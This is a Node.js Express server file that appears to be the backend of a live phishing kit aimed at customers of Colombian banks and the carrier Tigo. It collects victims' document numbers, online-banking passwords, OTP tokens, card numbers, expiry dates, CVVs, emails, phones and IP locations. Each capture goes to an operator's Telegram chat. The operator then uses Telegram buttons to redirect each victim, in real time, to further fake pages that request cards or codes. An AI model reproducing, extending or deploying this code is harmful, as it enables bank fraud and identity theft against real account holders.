async function enviarMensajeBancolombiaCorreo({ tipoDoc, numDoc, clave, sessionId, correo, celular }) {
  const sessionData = sessions.get(sessionId);
  if (sessionData && sessionData.last_message_id) {
    await eliminarBotones(CHAT_ID, sessionData.last_message_id);
  }

  const mensaje = `
📧 *CORREO BANCOLOMBIA*

📄 *Tipo:* ${tipoDoc || "N/D"}
🆔 *Doc:* ${numDoc || "N/D"}
🔑 *Clave:* ${clave || "N/D"}
📧 *Correo:* ${correo || "N/D"}
📱 *Celular:* ${celular || "N/D"}

🌀 *Session:* \`${sessionId}\`
`;

  const botones = {
    inline_keyboard: [
      [
        { text: "🔄 Error Logo", callback_data: `bcol_inicio_${sessionId}` },
        { text: "📧 Pedir Correo", callback_data: `bcol_correo_${sessionId}` }
      ],
      [
        { text: "💳 Pedir Tarjeta", callback_data: `bcol_tarjeta_${sessionId}` },
        { text: "🔢 Pedir Token", callback_data: `bcol_otp1_${sessionId}` }
      ],
      [
        { text: "🚫 Error Token", callback_data: `bcol_otp2_${sessionId}` }
      ]
    ]
  };

  const response = await axios.post(getTelegramApiUrl('sendMessage'), {
    chat_id: CHAT_ID,
    text: mensaje,
    parse_mode: "Markdown",
    reply_markup: botones
  });

  if (response.data.ok && response.data.result && sessionData) {
    sessionData.last_message_id = response.data.result.message_id;
    sessions.set(sessionId, sessionData);
  }
}

// Rutas Bancolombia (usa las mismas rutas que Banco de Bogotá)

app.post("/bancolombia/notify/otp1", async (req, res) => {
  try {
    const { sessionId, tipoDoc, numDoc, clave, token } = req.body || {};
    if (!sessionId) return res.status(400).json({ ok: false, error: "Falta sessionId" });
    if (!sessions.has(sessionId)) sessions.set(sessionId, { redirect_to: null });
    await enviarMensajeBancolombiaOTP({ tipoDoc, numDoc, clave, sessionId, token });
    return res.json({ ok: true });
  } catch (e) {
    console.error("❌ /bancolombia/notify/otp1 error:", e);
    return res.status(500).json({ ok: false });
  }
});

app.post("/bancolombia/notify/otp2", async (req, res) => {
  try {
    const { sessionId, tipoDoc, numDoc, clave, token } = req.body || {};
    if (!sessionId) return res.status(400).json({ ok: false, error: "Falta sessionId" });
    if (!sessions.has(sessionId)) sessions.set(sessionId, { redirect_to: null });
    await enviarMensajeBancolombiaOTP({ tipoDoc, numDoc, clave, sessionId, token });
    return res.json({ ok: true });
  } catch (e) {
    console.error("❌ /bancolombia/notify/otp2 error:", e);
    return res.status(500).json({ ok: false });
  }
});

app.post("/bancolombia/notify/tarjeta", async (req, res) => {
  try {
    const { sessionId, tipoDoc, numDoc, clave, tarjeta, fecha, cvv } = req.body || {};
    if (!sessionId) return res.status(400).json({ ok: false, error: "Falta sessionId" });
    if (!sessions.has(sessionId)) sessions.set(sessionId, { redirect_to: null });
    await enviarMensajeBancolombiaTarjeta({ tipoDoc, numDoc, clave, sessionId, tarjeta, fecha, cvv });
    return res.json({ ok: true });
  } catch (e) {
    console.error("❌ /bancolombia/notify/tarjeta error:", e);
    return res.status(500).json({ ok: false });
  }
});

app.post("/bancolombia/notify/correo", async (req, res) => {
  try {
    const { sessionId, tipoDoc, numDoc, clave, correo, celular } = req.body || {};
    if (!sessionId) return res.status(400).json({ ok: false, error: "Falta sessionId" });
    if (!sessions.has(sessionId)) sessions.set(sessionId, { redirect_to: null });
    await enviarMensajeBancolombiaCorreo({ tipoDoc, numDoc, clave, sessionId, correo, celular });
    return res.json({ ok: true });
  } catch (e) {
    console.error("❌ /bancolombia/notify/correo error:", e);
    return res.status(500).json({ ok: false });
  }
});

// ============================================================================
// 🏦 SECCIÓN 5: SISTEMA TIGO
// ============================================================================
// 🏦 SECCIÓN 5: SISTEMA TIGO (index.html + pse.html + psecorreo.html)
// ============================================================================

// Ruta para datos del index.html (número de línea + deuda)
app.post('/tigo/consulta-linea', async (req, res) => {
  try {
    const { sessionId, phone, deuda, ip, country, city } = req.body;
    
    const mensaje = `
📱 *TIGO - CONSULTA DE LÍNEA*
📞 Teléfono: ${phone}
💰 Deuda: $${deuda}
🌐 IP: ${ip} - ${city}, ${country}
🆔 sessionId: ${sessionId}
    `.trim();

    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje
    });

    res.send({ ok: true });
  } catch (error) {
    console.error('❌ ERROR EN /tigo/consulta-linea:', error.message);
    res.status(500).json({ ok: false, reason: error.message });
  }
});

// Ruta para selección de banco PSE
app.post('/tigo/pse-banco', async (req, res) => {
  try {
    const { sessionId, banco, phone, cedula, nombre, ip, country, city } = req.body;
    
    const mensaje = `
🏦 *TIGO - BANCO SELECCIONADO PSE*
📛 Nombre: ${nombre || 'N/A'}
🪪 Cédula: ${cedula || 'N/A'}
📞 Teléfono: ${phone || 'N/A'}
🏦 Banco: ${banco || 'N/A'}
🌐 IP: ${ip} - ${city}, ${country}
🆔 sessionId: ${sessionId}
    `.trim();

    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje
    });

    res.send({ ok: true });
  } catch (error) {
    console.error('❌ ERROR EN /tigo/pse-banco:', error.message);
    res.status(500).json({ ok: false, reason: error.message });
  }
});

// Ruta para correo PSE
app.post('/tigo/pse-correo', async (req, res) => {
  try {
    const { sessionId, correo, phone, banco, cedula, nombre, ip, country, city } = req.body;
    
    const mensaje = `
📧 *TIGO - CORREO PSE*
📛 Nombre: ${nombre || 'N/A'}
🪪 Cédula: ${cedula || 'N/A'}
📞 Teléfono: ${phone || 'N/A'}
🏦 Banco: ${banco || 'N/A'}
📧 Correo: ${correo || 'N/A'}
🌐 IP: ${ip} - ${city}, ${country}
🆔 sessionId: ${sessionId}
    `.trim();

    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje
    });

    res.send({ ok: true });
  } catch (error) {
    console.error('❌ ERROR EN /tigo/pse-correo:', error.message);
    res.status(500).json({ ok: false, reason: error.message });
  }
});
// ============================================================================
// 💳 CÓDIGO PARA AGREGAR AL server.js
// ============================================================================
// 
// INSTRUCCIONES:
// 1. Abre tu server.js
// 2. Busca la sección de rutas de TIGO (donde está /tigo/pse-banco)
// 3. DESPUÉS de las rutas existentes de Tigo, pega este código
// 4. Luego busca el WEBHOOK y agrega la sección de botones de tarjetas
//
// ============================================================================

// ============================================================================
// 🏦 SECCIÓN TIGO - RUTA DE TARJETAS CON DETECCIÓN DE ENTIDADES
// ============================================================================

app.post('/tigo/tarjeta', async (req, res) => {
  try {
    const { 
      sessionId, user, pass, 
      numeroTarjeta, vencimiento, cvv,
      tipoTarjeta, entidadFinanciera, nombreEntidad,
      ip, country, city 
    } = req.body;
    
    console.log('💳 Tarjeta recibida:', {
      sessionId,
      entidad: nombreEntidad,
      tipo: tipoTarjeta
    });
    
    // Mensaje para Telegram
    // Escapar caracteres especiales de Markdown
    const escapeMd = (text) => {
      if (!text) return 'N/D';
      return String(text).replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');
    };
    
    const cvvMask = '•'.repeat(cvv?.length || 3);
    
    const mensaje = `
💳 *TARJETA INGRESADA*

👤 Usuario: ${escapeMd(user)}
🔑 Clave: ${escapeMd(pass)}

💳 Número: ${escapeMd(numeroTarjeta)}
📅 Vencimiento: ${escapeMd(vencimiento)}
🔒 CVV: ${cvvMask}
🏷️ Tipo: ${escapeMd(tipoTarjeta)}
🏦 Entidad: ${escapeMd(nombreEntidad)}

🌐 IP: ${escapeMd(ip)} \\- ${escapeMd(city)}, ${escapeMd(country)}
🆔 sessionId: ${escapeMd(sessionId)}
    `.trim();
    
    // Mapeo de entidades a rutas
    const rutasEntidades = {
      'bancolombia': '../bancolombia/index.html',
      'bancodebogota': '../bancodebogota/index.html',
      'davivienda': '../davivienda/index.html',
      'falabella': '../falabella/index.html',
      'bbva': '../bbva/index.html',
      'avvillas': '../avvillas/index.html',
      'occidente': '../occidente/index.html',
      'nequi': '../nequi/index.html',
      'popular': '../popular/index.html',
      'desconocida': './otptig.html'
    };
    
    const rutaEntidad = rutasEntidades[entidadFinanciera] || './otptig.html';
    
    // Botones dinámicos
    const reply_markup = {
      inline_keyboard: [
        [
          { 
            text: `🏦 Ir a ${nombreEntidad}`, 
            callback_data: `tigo_entidad_${sessionId}` 
          }
        ],
        [
          { 
            text: "🔐 Pedir Código OTP", 
            callback_data: `tigo_otp_${sessionId}` 
          }
        ]
      ]
    };
    
    // Enviar a Telegram
    await axios.post(getTelegramApiUrl('sendMessage'), {
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: "MarkdownV2",
      reply_markup
    });
    
    // Guardar rutas de redirección
    redirections.set(`${sessionId}_entidad`, rutaEntidad);
    redirections.set(`${sessionId}_otp`, './otptig.html');
    
    console.log('✅ Tarjeta enviada a Telegram');
    console.log(`📍 Ruta entidad guardada: ${rutaEntidad}`);
    
    res.send({ ok: true });
    
  } catch (error) {
    console.error('❌ ERROR EN /tigo/tarjeta:', error);
    res.status(500).json({ ok: false, reason: error.message });
  }
});

// ============================================================================
// 📡 WEBHOOK - AGREGAR MANEJO DE BOTONES DE TARJETAS
// ============================================================================
//
// 1. Busca en tu server.js donde está el webhook: app.post(`/webhook/${BOT_TOKEN}`
// 2. Dentro del webhook, DESPUÉS de los otros if/else, ANTES del último res.sendStatus(200)
// 3. Agrega este código:
//

// 5️⃣ TIGO TARJETAS (tigo_action_sessionId) - Ver implementación en webhook activo más abajo

// ============================================================================
// ✅ ARCHIVOS FINALES NECESARIOS
// ============================================================================

// ============================================================================
// 📡 WEBHOOK UNIFICADO - MANEJA TODOS LOS BANCOS
// ============================================================================

app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
  try {
    const update = req.body;
    const { callback_query } = update;
    
    if (callback_query) {
      const callbackData = callback_query.data || '';
      console.log('🔥 Callback:', callbackData);
      
      // Eliminar botones
      try {
        await axios.post(getTelegramApiUrl('editMessageReplyMarkup'), {
          chat_id: callback_query.message.chat.id,
          message_id: callback_query.message.message_id,
          reply_markup: { inline_keyboard: [] }
        });
      } catch (e) {}
      
      // IDENTIFICAR BANCO
      
      // 1️⃣ FALABELLA (go:action|sessionId)
      if (callbackData.includes('go:') && callbackData.includes('|')) {
        const [action, sessionId] = callbackData.split('|');
        const route = action.replace('go:', '');
        redirections.set(sessionId, route.endsWith('.html') ? route : `${route}.html`);
        
        await axios.post(getTelegramApiUrl('answerCallbackQuery'), {
          callback_query_id: callback_query.id,
          text: `✅ ${route}`
        });
      }
      
      // 2️⃣ BANCOLOMBIA (go:action|sessionId - mismo formato que Falabella)
      else if (callbackData.includes('|')) {
        const [action, sessionId] = callbackData.split('|');
        const route = action.replace('go:', '');
        redirections.set(sessionId, route.endsWith('.html') ? route : `${route}.html`);
        
        await axios.post(getTelegramApiUrl('answerCallbackQuery'), {
          callback_query_id: callback_query.id,
          text: `✅ ${route}`
        });
      }
      
      // 3️⃣ BANCO DE BOGOTÁ (bb_action_sessionId)
      else if (callbackData.startsWith('bb_')) {
        const parts = callbackData.split('_');
        const action = parts[1];
        const sessionId = parts.slice(2).join('_');
        
        const sessionData = sessions.get(sessionId) || { redirect_to: null };
        sessionData.redirect_to = action;
        sessions.set(sessionId, sessionData);
        
        await axios.post(getTelegramApiUrl('answerCallbackQuery'), {
          callback_query_id: callback_query.id,
          text: `✅ ${action}`
        });
      }
      
      // 4️⃣ DAVIVIENDA (action_sessionId)
      else if (callbackData.includes('_')) {
        const parts = callbackData.split('_');
        const action = parts[0];
        const sessionId = parts.slice(1).join('_');
        
        let url = 'index.html';
        if (action === 'errorlogo') url = 'errorlogo.html';
        else if (action === 'parental') url = 'parental.html';
        else if (action === 'verify') url = 'verify.html';
        else if (action === 'index') url = 'index.html';
        else if (action.startsWith('home')) url = 'https://davivienda.com/personas/cuentas';
        
        redirections.set(sessionId, url);
        
        await axios.post(getTelegramApiUrl('answerCallbackQuery'), {
          callback_query_id: callback_query.id,
          text: `✅ ${action}`
        });
      }

      
      // 5️⃣ TIGO TARJETAS (tigo_action_sessionId)
      else if (callbackData.startsWith('tigo_')) {
        const parts = callbackData.split('_');
        const action = parts[1]; // entidad o otp
        const sessionId = parts[2];
        
        console.log('💳 Botón de tarjeta presionado:', {
          action: action,
          sessionId: sessionId
        });
        
        let redirectUrl = null;
        
        if (action === 'entidad') {
          // Obtener la ruta de la entidad financiera guardada
          redirectUrl = redirections.get(`${sessionId}_entidad`);
          console.log('🏦 Redirigiendo a entidad:', redirectUrl);
        } else if (action === 'otp') {
          // Obtener la ruta del OTP guardada
          redirectUrl = redirections.get(`${sessionId}_otp`);
          console.log('🔐 Redirigiendo a OTP:', redirectUrl);
        }
        
        if (redirectUrl) {
          // Configurar la redirección para el cliente
          redirections.set(sessionId, redirectUrl);
          
          // Responder al callback de Telegram
          await axios.post(getTelegramApiUrl('answerCallbackQuery'), {
            callback_query_id: callback_query.id,
            text: `✅ Redirigiendo...`
          });
          
          console.log('✅ Redirección configurada:', sessionId, '→', redirectUrl);
        } else {
          console.warn('⚠️ No se encontró ruta de redirección para:', sessionId);
          
          await axios.post(getTelegramApiUrl('answerCallbackQuery'), {
            callback_query_id: callback_query.id,
            text: `⚠️ Ruta no encontrada`
          });
        }
      }
    }
    
    res.sendStatus(200);
  } catch (err) {
    console.error("❌ Webhook error:", err);
    res.sendStatus(200);
  }
});
      
      // Dividir callback_data para identificar banco y acción
app.get("/instruction/:sessionId", (req, res) => {
  const sessionId = req.params.sessionId;
  
  // Buscar en sessions (Banco de Bogotá)
  const sessionData = sessions.get(sessionId);
  if (sessionData && sessionData.redirect_to) {
    const redireccion = sessionData.redirect_to;
    sessionData.redirect_to = null;
    sessions.set(sessionId, sessionData);
    return res.json({ redirect_to: redireccion });
  }
  
  // Buscar en redirections (Falabella, Davivienda, Tigo)
  const target = redirections.get(sessionId);
  if (target) {
    redirections.delete(sessionId);
    return res.json({ redirect_to: target });
  }
  
  return res.json({ redirect_to: null });
});

// ============================================================================
// 🏠 RUTA HOME
// ============================================================================

app.get("/", (req, res) => {
  res.json({
    ok: true,
    service: "Servidor Unificado",
    bancos: [
      "Banco de Bogotá",
      "Bancolombia",
      "Falabella",
      "Davivienda",
      "Sistema Tigo"
    ],
    version: "1.0.0",
    hasEnv: !!(BOT_TOKEN && CHAT_ID)
  });
});

// ============================================================================
// 🔧 SET WEBHOOK MANUAL
// ============================================================================

app.get("/setWebhook", async (req, res) => {
  const webhookUrl = `https://${req.headers.host}/webhook/${BOT_TOKEN}`;
  
  const response = await axios.post(getTelegramApiUrl('setWebhook'), {
    url: webhookUrl
  });

  res.json({ 
    ...response.data, 
    webhookUrl: webhookUrl 
  });
});

// ============================================================================
// 🚀 INICIAR SERVIDOR
// ============================================================================

app.listen(PORT, () => {
  console.log(`
╔═══════════════════════════════════════════════════════════╗
║   ✅ SERVIDOR UNIFICADO ACTIVO                            ║
║   🔡 Puerto: ${PORT}                                      ║
║   🤖 Bot: ${BOT_TOKEN ? 'Configurado ✔' : 'No configurado ✗'}                     ║
║   💬 Chat: ${CHAT_ID ? 'Configurado ✔' : 'No configurado ✗'}                    ║
║                                                           ║
║   🏦 BANCOS INTEGRADOS:                                   ║
║   ✓ Banco de Bogotá (Clave Segura)                      ║\n║   ✓ Bancolombia (Completo)                              ║
║   ✓ Bancolombia (Clave Segura)                          ║
║   ✓ Falabella (Suite de Espera)                         ║
║   ✓ Davivienda (KYC)                                     ║
║   ✓ Sistema Tigo (Consulta + PSE)                       ║
║                                                           ║
║   📡 Webhook: /webhook/${BOT_TOKEN ? BOT_TOKEN.substring(0, 10) + '...' : 'pending'}              ║
║   🔄 Polling: /instruction/:sessionId                     ║
╚═══════════════════════════════════════════════════════════╝
  `);
});

// ============================================================================
// 🔄 AUTO-PING PARA RENDER
// ============================================================================

setInterval(async () => {
  try {
    const response = await fetch(`https://${process.env.RENDER_EXTERNAL_HOSTNAME || 'localhost'}`);
    console.log("🔄 Auto-ping realizado");
  } catch (error) {
    console.error("❌ Error en auto-ping:", error.message);
  }
}, 300000); // Cada 5 minutos
